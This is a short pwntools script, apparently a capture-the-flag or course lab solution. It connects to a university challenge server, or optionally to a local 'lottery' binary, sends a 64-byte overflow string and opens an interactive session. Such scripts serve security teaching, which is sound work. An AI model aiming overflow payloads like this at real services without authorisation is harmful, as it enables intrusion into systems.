from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25161

### run a remote process
s = remote(SERVER, PORT, timeout=9999)

### run a local process
# s = process('./program/lottery', shell=True)

### interact with it

# s.recvall()
# s.recvuntil(b'Message : ')
# s.recvline()

input('')

s.sendline(64 * b'a')

s.interactive()
